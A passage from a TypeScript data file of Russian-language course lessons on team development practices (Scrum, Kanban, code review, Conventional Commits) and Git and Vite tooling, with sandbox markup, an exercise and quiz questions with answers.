import { Lesson } from '../types/curriculum';

export const proLessons: Lesson[] = [
  {
    "id": "pro-1",
    "moduleId": "pro",
    "level": 1,
    "title": "ИТ-индустрия и командная разработка",
    "subtitle": "Роли в команде, Agile, Scrum, Kanban, Code Review, Git Workflow и софт-скиллы",
    "description": "Как устроена реальная коммерческая разработка: роли (Frontend, Backend, QA, PM, UI/UX), спринты, дейли, планирование, культура Code Review, Git-процессы (Conventional Commits) и искусство эффективной инженерной коммуникации.",
    "estimatedMinutes": 45,
    "difficulty": "intermediate",
    "tags": [
      "Agile",
      "Scrum",
      "Kanban",
      "Code Review",
      "Git Workflow",
      "Conventional Commits",
      "Soft Skills"
    ],
    "theory": {
      "overview": "Написание чистого программного кода — лишь 40% ежедневной работы коммерческого разработчика. В реальной продуктовой IT-компании успех проекта и ваш карьерный рост зависят от слаженности команды, предсказуемости процессов, культуры ревью и зрелых софт-скиллов.\n\nПонимание ролей в компании, методологий разработки (`Scrum` / `Kanban`) и стандартов совместной работы помогает стажёру быстро влиться в рабочий процесс, успешно пройти испытательный срок и вырасти до уровня Middle.",
      "sections": [
        {
          "title": "Роли в продуктовой IT-команде и матрица ответственности",
          "content": "В современной кросс-функциональной IT-команде каждый специалист отвечает за свою часть жизненного цикла продукта:\n- **Product Manager (PM) / Product Owner (PO)**: определяет цели бизнеса и потребности пользователей. Формирует продуктовый бэклог (`Product Backlog`), приоритизирует фичи и отвечает за бизнес-метрики (ROI, Retention, Conversion Rate).\n- **UI/UX Designer**: исследует пользовательский опыт, создает интерактивные прототипы в Figma, проектирует дизайн-систему (UI Kit) и готовит спецификации для верстки.\n- **Frontend Developer**: превращает макеты Figma в быстрый, адаптивный, доступный (`a11y`) и надежный клиентский веб-интерфейс на HTML/CSS/JS/React/Vue.\n- **Backend Developer**: проектирует архитектуру баз данных (PostgreSQL, Redis), бизнес-логику и предоставляет клиентам REST API или GraphQL эндпоинты.\n- **QA Engineer (Quality Assurance)**: тестирует функциональность, проверяет краевые случаи (Edge Cases), пишет автотесты и следит за отсутствием регрессионных багов.\n- **DevOps / SRE Engineer**: настраивает CI/CD пайплайны автоматической сборки, тестирования и развертывания кода на серверах и в облаке (Kubernetes, Docker, AWS).",
          "codeExample": {
            "language": "bash",
            "title": "Жизненный цикл продуктовой задачи (Feature Flow)",
            "code": "1. [Идея] Бизнес-требование от Product Manager\n2. [Дизайн] Проектирование UI/UX макета в Figma\n3. [Спецификация] Согласование контракта API (Swagger / OpenAPI)\n4. [Разработка] Написание кода в ветке feature/*\n5. [Code Review] Проверка кода коллегами и наставником\n6. [QA] Тестирование на тестовом стенде (Staging)\n7. [Релиз] Автоматический деплой в продакшен (CI/CD)",
            "explanation": "Стандартный путь любой фичи от идеи до релиза обеспечивает высокое качество продукта без поломок на продакшене."
          }
        },
        {
          "title": "Методологии разработки: Scrum против Kanban",
          "content": "Для организации командной работы применяются гибкие методологии Agile:\n\n**1. Scrum (Итеративная разработка фиксированными спринтами):**\n- **Спринт (Sprint)**: фиксированный отрезок времени (обычно 1 или 2 недели), за который команда берется реализовать запланированный объем задач.\n- **Sprint Planning (Планирование)**: встреча в начале спринта, где команда оценивает задачи в Story Points и формирует `Sprint Backlog`.\n- **Daily Standup (Дейли-митинг)**: 15-минутная ежедневная синхронизация, где каждый разработчик отвечает на 3 вопроса: 1) Что сделал вчера? 2) Что сделаю сегодня? 3) Есть ли блокеры/трудности?\n- **Sprint Demo / Review**: показ готового функционала стейкхолдерам в конце спринта.\n- **Retrospective (Ретроспектива)**: честный разбор процессов внутри команды: что прошло отлично, что пошло не так и какие улучшения внедрить со следующего спринта.\n\n**2. Kanban (Непрерывный поток задач):**\n- Работа строится без жестких спринтов по принципу «тяни задачу из очереди» (`Pull System`).\n- Ключевой принцип — ограничение незавершенной работы (`WIP Limits` — Work In Progress). Если колонка «In Review» переполнена, разработчики не берут новые задачи, а помогают коллегам допроверить открытые пуллреквесты.",
          "codeExample": {
            "language": "bash",
            "title": "Эталонный шаблон ответа стажёра на Daily Standup",
            "code": "1. Вчера: закончил верстку семантической карточки профиля, настроил адаптив под мобильные устройства и покрыл тестами.\n2. Сегодня: подключу отправку данных формы заказа к эндпоинту POST /api/v1/checkout.\n3. Блокеры: жду от бэкенда тестовый JWT-токен авторизации в Swagger для локального тестирования.",
            "explanation": "Краткий, емкий и понятный отчет на дейли-митинге: конкретные результаты, четкий план и своевременная подсветка блокеров."
          },
          "image": {
            "src": "/images/lessons/scrum-sprint-cycle.jpg",
            "alt": "Цикл Scrum-спринта: Planning → Standup → Development → Review → Retrospective",
            "caption": "Scrum Sprint: итеративный цикл разработки продукта длиной 1-2 недели"
          }
        },
        {
          "title": "Культура Code Review и стандарты Conventional Commits",
          "content": "**Культура Code Review (Взаимная проверка кода):**\n- Code Review — это не экзамен и не поиск виноватых, а инструмент совместного обучения, обмена контекстом и защиты продакшена от багов.\n- **Правила для автора Pull Request (PR):**\n  • Создавайте небольшие атомарные PR (до 300-400 строк кода) — их легче и быстрее проверять.\n  • Добавляйте подробное описание: какую задачу решали, прикрепляйте скриншоты или GIF работы интерфейса.\n  • Запустите линтер (`npm run lint`) и тесты перед отправкой на ревью.\n- **Правила для ревьюера:**\n  • Будьте доброжелательны и аргументируйте свои замечания ссылками на документацию или стандарты.\n  • Разделяйте критические замечания (`[Blocker]`) и вкусовые пожелания (`[Nitpick] / [FYI]`).\n\n**Стандарт Conventional Commits:**\nФорматируйте сообщения коммитов по общепринятому стандарту `тип(область): описание`:\n- `feat(auth): add social login with GitHub` — новая фича.\n- `fix(cart): prevent double submit on checkout button` — исправление бага.\n- `refactor(styles): migrate to modern CSS grid layout` — рефакторинг без изменения функционала.\n- `docs(readme): add local setup instructions` — обновление документации.\n- `style(code): fix indentation and formatting via Prettier` — правки кодстайла.\n- `test(api): add unit tests for fetch client` — добавление тестов.",
          "codeExample": {
            "language": "bash",
            "title": "Примеры правильных коммитов и чеклист перед открытием PR",
            "code": "# Примеры качественных коммитов по стандарту Conventional Commits\ngit commit -m \"feat(lessons): add interactive code runner sandbox\"\ngit commit -m \"fix(sidebar): resolve text truncation on narrow mobile screens\"\ngit commit -m \"refactor(quiz): extract FormattedText into reusable utility\"\n\n# Чеклист разработчика перед отправкой Pull Request:\n# [x] npm run build проходит без ошибок компиляции\n# [x] Удалены console.log, закомментированный код и временные файлы\n# [x] Интерфейс протестирован в DevTools на мобильных и десктопных разрешениях\n# [x] Добавлено описание и ссылка на тикет в Jira/Trello",
            "explanation": "Стандартизированное форматирование коммитов и самоконтроль перед ревью экономят часы времени всей команды."
          }
        },
        {
          "title": "Инженерные софт-скиллы: Правило 15 минут и асинхронная коммуникация",
          "content": "Технические навыки открывают дверь в профессию, но карьерный рост определяют софт-скиллы:\n\n**1. «Правило 15 минут» (Как правильно задавать вопросы ментору):**\nЕсли вы столкнулись с непонятной ошибкой или блокирующей проблемой:\n- 1. **Первые 15-20 минут** исследуйте проблему самостоятельно: прочитайте текст ошибки в DevTools, поищите в официальной документации, проверьте соседние похожие модули кодовой базы.\n- 2. **Если решения нет** — не сидите молча полдня! Обратитесь к наставнику со структурированным сообщением:\n  • **Контекст**: «Я решаю задачу X (тикет #124)».\n  • **Что происходит**: «Получаю ошибку TypeError: Cannot read property 'map' of undefined в компоненте CartList».\n  • **Что уже попробовал**: «Проверил входящий пропс через console.log — до ответа сервера туда приходит null. Попробовал поставить опциональную цепочку ?. и проверку Array.isArray».\n  • **Конкретный вопрос**: «Подскажи, стоит ли нам отдавать дефолтный пустой массив из хука useCart, или обрабатывать загрузку внутри компонента?»\n\n**2. Асинхронная коммуникация в командных чатах:**\n- Не пишите в Slack/Telegram пустое «Привет!» с ожиданием ответа. Сразу пишите суть вопроса в одном емком сообщении.\n- Оформляйте код в чатах через бэктики, чтобы коллегам было удобно читать код со смартфона.",
          "codeExample": {
            "language": "bash",
            "title": "Сравнение плохого и идеального обращения за помощью",
            "code": "# ❌ ПЛОХО: Неинформативно, отнимает время на наводящие вопросы\n\"Привет, у меня ничего не работает, посмотри пожалуйста.\"\n\n# ✅ ИДЕАЛЬНО: Структурированный запрос с контекстом и предпринятыми попытками\n\"Привет! Делаю задачу #42 (фильтрация уроков). \nПри клике на тег получаю ошибку в QuizSection.tsx:32.\nУже проверил: данные приходят в UTF-8, но regex не матчит скобки.\nПосмотри, пожалуйста, когда будет свободная минута — вот ссылка на ветку: git/branch/feat-42\"",
            "explanation": "Структурированный отчет по стандарту Agile и открытый диалог позволяют ментору за 2 минуты дать точную подсказку."
          }
        }
      ],
      "seniorTips": [
        "Никогда не бойтесь задавать вопросы ментору! Самый опасный стажёр — не тот, кто задает вопросы, а тот, кто молча сидит 3 дня над одной строчкой кода и боится показаться некомпетентным.",
        "Оставляйте полезные описания к своим Pull Request: прикрепляйте скриншоты интерфейса и кратко перечисляйте сделанные изменения.",
        "Относитесь к замечаниям на Code Review с благодарностью: это самый быстрый и бесплатный способ вырасти из Junior в Middle под руководством опытных инженеров.",
        "Всегда пишите понятные сообщения коммитов по Conventional Commits (feat, fix, refactor) — через 6 месяцев вы сами скажете себе спасибо.",
        "Соблюдайте договоренности по кодстайлу в команде: используйте автоформатирование Prettier при каждом сохранении файла.",
        "На дейли-митинге всегда говорите о блокерах сразу: подсвеченная вовремя проблема решается за 5 минут."
      ],
      "commonMistakes": [
        {
          "bad": "Прятать свои ошибки, сидеть в тупике несколько дней и до последнего скрывать проблемы от команды",
          "good": "Попробовать решить проблему 15 минут, а затем прийти к ментору со структурированным вопросом",
          "reason": "Раннее обнаружение блокера позволяет команде скорректировать планы и быстро помочь вам двигаться дальше."
        },
        {
          "bad": "Коммиты с названиями: 'fix', 'update', 'asdasd', 'done', 'final_fix2'",
          "good": "Семантические коммиты: 'feat(cart): add promo code validation', 'fix(auth): handle expired session token'",
          "reason": "По невнятным коммитам невозможно понять историю изменений, сложно делать git bisect и нельзя автоматически сгенерировать релизный Changelog."
        },
        {
          "bad": "Открывать гигантский Pull Request на 2000 измененных строк кода в 50 файлах",
          "good": "Разбивать большую задачу на серию небольших, независимых PR по 200-300 строк",
          "reason": "Огромные пуллреквесты проверяются поверхностно, содержат скрытые баги и блокируют работу коллег на несколько дней."
        },
        {
          "bad": "Спорить на Code Review из-за личных вкусовых предпочтений форматирования (табы против пробелов)",
          "good": "Делегировать проверку форматирования автоматическим линтерам ESLint и Prettier в CI/CD",
          "reason": "Человеческое ревью должно фокусироваться на архитектуре, безопасности и бизнес-логике, а не на пробелах."
        }
      ],
      "keyTakeaways": [
        "Продуктовая веб-разработка — это командная работа, где софт-скиллы и коммуникация так же важны, как знание синтаксиса.",
        "Scrum структурирует разработку спринтами (1-2 недели), дейли-митингами, демо и ретроспективами.",
        "Kanban организует непрерывный поток задач с ограничением объема незавершенной работы (WIP Limits).",
        "Code Review — главный инструмент обеспечения качества кода и профессионального роста инженера.",
        "Стандарт Conventional Commits (feat, fix, refactor) делает историю проекта прозрачной и масштабируемой.",
        "Правило 15 минут позволяет соблюдать баланс между самостоятельным поиском и эффективной помощью наставника."
      ]
    },
    "sandbox": {
      "initialHtml": "<div class=\"scrum-board\">\n  <div class=\"board-header\">\n    <h3>Интерактивная Scrum / Kanban Доска Спринта</h3>\n    <span class=\"sprint-badge\">Спринт #14 (Осталось 4 дня)</span>\n  </div>\n  \n  <div class=\"board-columns\">\n    <div class=\"board-col\">\n      <div class=\"col-header col-todo\">\n        <span>To Do (К выполнению)</span>\n        <span class=\"task-count\">2</span>\n      </div>\n      <div class=\"task-card\">\n        <span class=\"task-tag tag-feat\">feat</span>\n        <h4>Интеграция Swagger API</h4>\n        <p>Подключить методы авторизации</p>\n      </div>\n      <div class=\"task-card\">\n        <span class=\"task-tag tag-test\">test</span>\n        <h4>E2E тесты оформления заказа</h4>\n        <p>Покрыть сценарий оплаты</p>\n      </div>\n    </div>\n\n    <div class=\"board-col\">\n      <div class=\"col-header col-progress\">\n        <span>In Progress (В работе)</span>\n        <span class=\"task-count\">1</span>\n      </div>\n      <div class=\"task-card in-work\">\n        <span class=\"task-tag tag-feat\">feat</span>\n        <h4>Семантическая верстка визитки</h4>\n        <p>Адаптивная верстка и доступность</p>\n        <div class=\"assignee\">👤 Стажёр Frontend</div>\n      </div>\n    </div>\n\n    <div class=\"board-col\">\n      <div class=\"col-header col-done\">\n        <span>Done (Выполнено)</span>\n        <span class=\"task-count\">2</span>\n      </div>\n      <div class=\"task-card done\">\n        <span class=\"task-tag tag-fix\">fix</span>\n        <h4>Баг с кодировкой UTF-8 в OpenGraph</h4>\n        <p>Устранено отображение вопросиков</p>\n      </div>\n      <div class=\"task-card done\">\n        <span class=\"task-tag tag-feat\">feat</span>\n        <h4>Хайлайтер синтаксиса в CodeBlock</h4>\n        <p>Внедрена киберпанк подсветка</p>\n      </div>\n    </div>\n  </div>\n</div>",
      "initialCss": ".scrum-board {\n  background: #0a0e13;\n  border: 1px solid #1a2230;\n  padding: 20px;\n  border-radius: 8px;\n  color: #d6f5e3;\n  font-family: 'Inter', sans-serif;\n}\n.board-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  margin-bottom: 20px;\n  border-bottom: 1px solid #1a2230;\n  padding-bottom: 12px;\n}\n.board-header h3 { font-size: 16px; color: #ffffff; margin: 0; }\n.sprint-badge {\n  background: rgba(45, 255, 138, 0.1);\n  color: #2dff8a;\n  border: 1px solid rgba(45, 255, 138, 0.3);\n  font-size: 11px;\n  font-weight: 700;\n  padding: 3px 8px;\n  border-radius: 4px;\n  font-family: 'JetBrains Mono', monospace;\n}\n.board-columns {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  gap: 14px;\n}\n.board-col {\n  background: #06090d;\n  border: 1px solid #141a22;\n  border-radius: 6px;\n  padding: 12px;\n  display: flex;\n  flex-direction: column;\n  gap: 10px;\n}\n.col-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  font-size: 11px;\n  font-weight: 700;\n  text-transform: uppercase;\n  letter-spacing: 0.06em;\n  font-family: 'JetBrains Mono', monospace;\n  padding-bottom: 8px;\n  border-bottom: 2px solid transparent;\n}\n.col-todo { color: #29e7ff; border-color: #29e7ff; }\n.col-progress { color: #ffb02e; border-color: #ffb02e; }\n.col-done { color: #2dff8a; border-color: #2dff8a; }\n.task-count { background: #141a22; padding: 1px 6px; border-radius: 10px; color: #a8c8b6; }\n.task-card {\n  background: #0f141a;\n  border: 1px solid #233044;\n  padding: 12px;\n  border-radius: 4px;\n  transition: all 0.2s;\n}\n.task-card:hover { border-color: #2dff8a; transform: translateY(-2px); }\n.task-card.in-work { border-left: 3px solid #ffb02e; }\n.task-card.done { border-left: 3px solid #2dff8a; opacity: 0.85; }\n.task-card h4 { font-size: 13px; margin: 6px 0 4px 0; color: #ffffff; }\n.task-card p { font-size: 11px; color: #a8c8b6; margin: 0; line-height: 1.4; }\n.task-tag {\n  font-size: 9px;\n  text-transform: uppercase;\n  font-weight: 800;\n  padding: 2px 5px;\n  border-radius: 3px;\n  font-family: 'JetBrains Mono', monospace;\n}\n.tag-feat { background: rgba(41, 231, 255, 0.15); color: #29e7ff; }\n.tag-fix { background: rgba(255, 59, 92, 0.15); color: #ff3b5c; }\n.tag-test { background: rgba(255, 176, 46, 0.15); color: #ffb02e; }\n.assignee { margin-top: 8px; font-size: 10px; color: #2dff8a; font-family: 'JetBrains Mono', monospace; }",
      "initialJs": "console.log('Канбан-доска уровня 1 инициализирована!');",
      "instructions": "Изучите организацию задач на канбан-доске спринта. Попробуйте отредактировать названия задач и добавить новую карточку в колонку In Progress."
    },
    "task": {
      "title": "Составление отчета на Standup и Pull Request описания",
      "scenario": "Вам необходимо сформировать структурированный инженерный отчет для Daily Standup и оформить чеклист готовности Pull Request для слияния новой функциональности в ветку main.",
      "criteria": [
        "Создан объект отчета standupReport с полями yesterday, today, blockers",
        "Создан массив чеклиста prChecklist с обязательными пунктами самоконтроля",
        "Использован стандарт Conventional Commits для описания сделанных изменений"
      ],
      "starterCode": {
        "html": "<div id=\"report-preview\">Отчет стажёра</div>",
        "css": "body { font-family: monospace; background: #0a0e13; color: #2dff8a; padding: 20px; }",
        "js": "// Сформируйте отчет для Daily Standup и чеклист Pull Request\nconst standupReport = {\n  \n};\n\nconst prChecklist = [\n  \n];\n\nconsole.log(standupReport, prChecklist);\n"
      },
      "hints": [
        "В поле blockers укажите null, если блокеров нет, или строку с описанием проблемы.",
        "Включите в чеклист проверку сборки npm run build и проверку адаптивности."
      ],
      "solution": {
        "html": "<div id=\"report-preview\">Отчет сформирован по стандартам Agile</div>",
        "css": "body { font-family: monospace; color: #2dff8a; }",
        "js": "const standupReport = {\n  yesterday: 'feat(cart): реализовал адаптивную верстку корзины покупок',\n  today: 'feat(checkout): подключаю валидацию формы и отправку заказа в API',\n  blockers: null\n};\n\nconst prChecklist = [\n  'npm run build и линтер прошли без ошибок',\n  'Удалены временные console.log и закомментированный код',\n  'Проверена адаптивность в DevTools (375px, 768px, 1440px)',\n  'Сообщения коммитов оформлены по Conventional Commits'\n];\n\nconsole.log('Дейли отчет:', standupReport);\nconsole.log('Чеклист PR:', prChecklist);",
        "explanation": "Структурированный отчет по стандарту Agile и чеклист перед отправкой на Code Review."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "p1-q1",
          "question": "Ревьюер оставил пять замечаний о пробелах, переносах строк и кавычках. Что стоит изменить в процессе?",
          "options": [
            "Отдать форматирование Prettier в хук перед коммитом, освободив ревью для логики",
            "Ничего: следить за единообразием оформления — прямая обязанность ревьюера",
            "Ввести правило, запрещающее оставлять больше трёх замечаний на один запрос",
            "Перенести обсуждение стиля в отдельный запрос уже после слияния основного"
          ],
          "correctIndex": 0,
          "explanation": "Всё, что можно проверить машиной, машина и должна проверять: автоформатирование при коммите плюс линтер в конвейере. Внимание человека — ресурс дорогой и ограниченный, тратить его на кавычки значит не заметить настоящую проблему в архитектуре, безопасности или бизнес-логике. Ограничивать число замечаний бессмысленно, а откладывать их на потом — значит не сделать никогда."
        },
        {
          "id": "p1-q2",
          "question": "Что из перечисленного НЕ входит в формат ежедневной встречи команды?",
          "options": [
            "Подробный разбор технического решения возникшей проблемы",
            "Что планируется взять в работу сегодня",
            "Что удалось сделать со времени прошлой встречи",
            "Какие препятствия мешают двигаться дальше"
          ],
          "correctIndex": 0,
          "explanation": "Ежедневная встреча — короткая синхронизация на пятнадцать минут, а не рабочее совещание. Её задача в том, чтобы команда увидела общую картину и вскрыла препятствия. Подробное обсуждение решения затягивает встречу и отнимает время у тех, кого оно не касается: такие вопросы выносят в отдельный разговор сразу после, с участием только заинтересованных."
        },
        {
          "id": "p1-q3",
          "question": "В чём смысл правила пятнадцати минут для стажёра?",
          "options": [
            "Делать обязательный перерыв каждые пятнадцать минут работы над кодом",
            "Ограничить время самостоятельного поиска, чтобы задача не стояла слишком долго",
            "Отводить ровно пятнадцать минут на выполнение каждой задачи спринта",
            "Не обращаться к наставнику чаще, чем раз в пятнадцать минут"
          ],
          "correctIndex": 1,
          "explanation": "Правило уравновешивает две крайности. Сразу бежать с вопросом — значит не научиться разбираться самому и дёргать команду по мелочам. Молча сидеть три дня — значит сорвать сроки и потерять время, которое опытный коллега сэкономил бы за пять минут. Пятнадцать-двадцать минут поиска обычно достаточно, а вопрос после них получается осмысленным: что пробовали, что получили, где застряли."
        },
        {
          "id": "p1-q4",
          "question": "Исправлена ошибка в расчёте скидки в корзине. Какой префикс коммита по стандарту Conventional Commits верен?",
          "options": [
            "`feat(cart): исправлен расчёт скидки`",
            "`fix(cart): исправлен расчёт скидки`",
            "`chore(cart): исправлен расчёт скидки`",
            "`refactor(cart): исправлен расчёт скидки`"
          ],
          "correctIndex": 1,
          "explanation": "Каждый тип имеет строгое значение, и от него зависит автоматическая генерация списка изменений и повышение версии. Исправление ошибки — это `fix`, новая возможность — `feat`, изменение кода без изменения поведения — `refactor`, а служебные правки вроде обновления зависимостей — `chore`. Указание в скобках уточняет затронутую часть проекта."
        },
        {
          "id": "p1-q5",
          "question": "Зачем в Kanban ограничивают количество задач, одновременно находящихся в одной колонке?",
          "options": [
            "Чтобы вскрыть узкое место потока: переполненная колонка показывает, где затор",
            "Чтобы доска визуально помещалась на экране без горизонтальной прокрутки",
            "Чтобы каждый участник команды брал в работу не более одной задачи за спринт",
            "Чтобы система автоматически распределяла задачи между свободными разработчиками"
          ],
          "correctIndex": 0,
          "explanation": "Ограничение делает проблему видимой. Если колонка ревью упёрлась в предел, брать новые задачи нельзя — и команда вынуждена сначала разгрузить ревью, а не наращивать гору незавершённой работы. Так становится очевидно, где именно поток тормозит. Без ограничений каждый занят своим делом, а до готового продукта не доходит ничего."
        }
      ]
    }
  },
  {
    "id": "pro-2",
    "moduleId": "pro",
    "level": 2,
    "title": "Git, ветвление и инструменты сборки",
    "subtitle": "Git Flow, Conventional Commits, разрешение конфликтов, Vite, npm/pnpm и CI/CD пайплайн",
    "description": "Освойте профессиональный Git-воркфлоу: создание и мерж веток, разрешение конфликтов, стандарт Conventional Commits. Изучите экосистему инструментов: Vite, npm, pnpm, ESLint, Prettier и основы CI/CD.",
    "estimatedMinutes": 60,
    "difficulty": "intermediate",
    "tags": [
      "git",
      "branching",
      "conventional-commits",
      "vite",
      "npm",
      "ci-cd",
      "eslint"
    ],
    "theory": {
      "overview": "В первом уроке модуля Pro мы познакомились с ролями в команде и Agile-методологиями. Теперь пришло время освоить инструменты, которые вы будете использовать ЕЖЕДНЕВНО: систему контроля версий Git и экосистему сборки frontend-проекта.\n\nGit — не просто утилита для сохранения кода. Это система СОВМЕСТНОЙ РАБОТЫ, которая позволяет десяткам разработчиков параллельно работать над одним проектом без конфликтов. Понимание Git на глубоком уровне — обязательный навык для прохождения любого технического собеседования.",
      "sections": [
        {
          "title": "Git: Feature-Branch Workflow и работа с ветками",
          "content": "Feature-Branch Workflow — стандарт в индустрии. Его суть: каждая новая фича, баг-фикс или задача разрабатывается в ОТДЕЛЬНОЙ ветке, а затем вливается в main через Pull Request (PR) с обязательным Code Review.\n\nОсновные команды Git для ежедневной работы:\n\nСоздание и переключение веток:\n`git checkout -b feature/user-profile` — создать и переключиться на новую ветку\n`git switch -c feature/user-profile` — современный аналог (Git 2.23+)\n`git branch` — список локальных веток\n`git branch -a` — список всех веток (включая remote)\n\nРабота с изменениями:\n`git status` — текущее состояние рабочей директории\n`git diff` — различия в незафиксированных файлах\n`git add .` — добавить все изменения в staging area\n`git add -p` — интерактивный staging (по хункам) — РЕКОМЕНДУЕТСЯ для атомарных коммитов\n`git commit -m 'feat(profile): add avatar upload'` — коммит с Conventional Commits\n`git commit --amend` — изменить последний коммит (сообщение или добавить файлы)\n\nСинхронизация с remote:\n`git push origin feature/user-profile` — отправить ветку на remote\n`git pull origin main` — получить последние изменения из main\n`git fetch` — скачать данные из remote без merge\n\nМерж и rebase:\n`git merge main` — влить main в текущую ветку (merge commit)\n`git rebase main` — перенести коммиты поверх main (линейная история)\n\nОтмена изменений:\n`git stash` — сохранить незакоммиченные изменения во временное хранилище\n`git stash pop` — восстановить сохранённые изменения\n`git reset --soft HEAD~1` — отменить последний коммит (изменения сохранятся в staging)",
          "image": {
            "src": "/images/lessons/git-branch-workflow.jpg",
            "alt": "Git Feature-Branch Workflow: создание ветки, коммиты, Pull Request и мерж в main",
            "caption": "Feature-Branch Workflow: каждая задача — отдельная ветка → Pull Request → Code Review → Merge в main"
          },
          "codeExample": {
            "language": "bash",
            "code": "# 1. Создать ветку от main\ngit checkout main\ngit pull origin main\ngit checkout -b feature/login-form\n\n# 2. Разработка: файлы → staging → commit\ngit add -p\ngit commit -m \"feat(auth): add login form component\"\n\n# 3. Push ветки на remote\ngit push origin feature/login-form\n\n# 4. Создать Pull Request на GitHub/GitLab\n# → Code Review → Approve\n\n# 5. Merge в main (через UI или CLI)\ngit checkout main\ngit pull origin main\ngit merge feature/login-form\ngit push origin main\n\n# 6. Удалить ветку\ngit branch -d feature/login-form\ngit push origin --delete feature/login-form",
            "title": "Полный цикл Feature-Branch Workflow",
            "explanation": "Всегда начинайте от актуального main. git add -p для атомарных коммитов. Push ветку → PR → Code Review → Merge → Удалить ветку. Это стандартный цикл в продуктовых командах."
          }
        },
        {
          "title": "Conventional Commits и разрешение Git-конфликтов",
          "content": "Conventional Commits — стандартизированный формат сообщений коммитов, принятый в индустрии. Он позволяет автоматически генерировать CHANGELOG, определять семантическую версию (SemVer) и упрощает навигацию по истории.\n\nФормат: `<type>(<scope>): <description>`\n\nТипы коммитов:\n`feat:` — новая функциональность (MINOR версия)\n`fix:` — исправление бага (PATCH версия)\n`refactor:` — рефакторинг без изменения функциональности\n`docs:` — изменения документации\n`style:` — форматирование, пробелы, запятые (не CSS!)\n`test:` — добавление или исправление тестов\n`chore:` — обновление зависимостей, конфигов, CI\n`perf:` — оптимизация производительности\n`ci:` — изменения CI/CD пайплайна\n\nПримеры хороших коммитов:\n`feat(auth): add JWT token refresh mechanism`\n`fix(cart): prevent double submit on checkout`\n`refactor(api): extract validation into middleware`\n`docs(readme): add deployment instructions`\n\nРазрешение Git-конфликтов:\nКонфликты возникают, когда два разработчика изменили одну и ту же строку в одном файле. Git маркирует конфликт специальными маркерами:\n\n`<<<<<<< HEAD` — ваши изменения\n`=======` — разделитель\n`>>>>>>> feature/other-branch` — чужие изменения\n\nАлгоритм разрешения:\n1. Открыть файл в VS Code (встроенный Merge Editor)\n2. Выбрать: принять ваши (Accept Current), принять чужие (Accept Incoming), принять оба (Accept Both), или отредактировать вручную\n3. Удалить маркеры конфликта\n4. `git add .` + `git commit` (без -m — Git предложит сообщение)\n5. Проверить, что код работает (npm run build)",
          "codeExample": {
            "language": "bash",
            "code": "# Conventional Commits — примеры\ngit commit -m \"feat(profile): add avatar upload with drag-and-drop\"\ngit commit -m \"fix(login): handle 401 response with redirect\"\ngit commit -m \"refactor(api): migrate from axios to fetch\"\ngit commit -m \"test(cart): add unit tests for discount calculation\"\ngit commit -m \"chore(deps): upgrade react to 19.1.0\"\n\n# Breaking Change (MAJOR версия)\ngit commit -m \"feat(api)!: change auth endpoint from /login to /auth/sign-in\n\nBREAKING CHANGE: /login endpoint removed.\nMigrate to /auth/sign-in.\"\n\n# Разрешение конфликта\ngit merge main\n# CONFLICT in src/App.tsx\n# Открыть в VS Code → Merge Editor\n# Разрешить → сохранить\ngit add src/App.tsx\ngit commit  # Авто-сообщение: 'Merge branch main into...'",
            "title": "Conventional Commits и разрешение конфликтов",
            "explanation": "feat! с BREAKING CHANGE в теле — для мажорных изменений. При конфликте Git маркирует проблемные строки. VS Code Merge Editor визуально показывает оба варианта. После разрешения — add + commit."
          }
        },
        {
          "title": "Vite, пакетные менеджеры (npm/pnpm) и конфигурация проекта",
          "content": "Современный frontend-проект состоит из множества инструментов. Разберём ключевые.\n\nVite — современный сборщик и dev-server:\n- Dev-режим: мгновенный Hot Module Replacement (HMR) через нативные ES-модули — без бандлинга!\n- Продакшен: оптимизированная сборка через Rollup (tree-shaking, code splitting, минификация)\n- Поддерживает: TypeScript, JSX/TSX, CSS Modules, PostCSS, SASS из коробки\n- `npm create vite@latest my-app -- --template react-ts` — создание проекта\n\nСтруктура Vite-проекта:\n`package.json` — манифест проекта: зависимости, скрипты, метаданные\n`vite.config.ts` — конфигурация Vite: алиасы, плагины, proxy для API\n`tsconfig.json` — конфигурация TypeScript\n`index.html` — входная точка (в корне, не в public!)\n`src/` — исходный код приложения\n`public/` — статические файлы (копируются as-is)\n`dist/` — продакшен-сборка (git-ignored)\n\nПакетные менеджеры:\n`npm` — встроен в Node.js. `package.json` + `package-lock.json`\n`pnpm` — альтернатива. Экономит диск: shared store, жёсткие ссылки. `pnpm-lock.yaml`\n`yarn` — альтернатива от Facebook. `yarn.lock`\n\nКлючевые команды:\n`npm install` / `pnpm install` — установить все зависимости из lock-файла\n`npm install react` — добавить dependency\n`npm install -D vitest` — добавить devDependency\n`npm run dev` — запустить dev-server\n`npm run build` — продакшен-сборка\n`npm run preview` — превью продакшен-билда\n\n`dependencies` vs `devDependencies`:\n- `dependencies`: react, react-dom, zustand — нужны в runtime\n- `devDependencies`: vite, typescript, eslint, prettier — только для разработки",
          "codeExample": {
            "language": "javascript",
            "code": "// package.json — манифест проекта\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"tsc && vite build\",\n    \"preview\": \"vite preview\",\n    \"lint\": \"eslint src/\",\n    \"format\": \"prettier --write src/\"\n  },\n  \"dependencies\": {\n    \"react\": \"^19.1.0\",\n    \"react-dom\": \"^19.1.0\"\n  },\n  \"devDependencies\": {\n    \"vite\": \"^6.0.0\",\n    \"typescript\": \"^5.7.0\",\n    \"@types/react\": \"^19.1.0\",\n    \"eslint\": \"^9.0.0\",\n    \"prettier\": \"^3.0.0\"\n  }\n}",
            "title": "Структура package.json и скрипты проекта",
            "explanation": "type: module — ES-модули. scripts — npm run команды. dependencies — runtime. devDependencies — инструменты разработки. Версии с ^ (caret) разрешают minor/patch обновления."
          }
        },
        {
          "title": "ESLint, Prettier и основы CI/CD пайплайна",
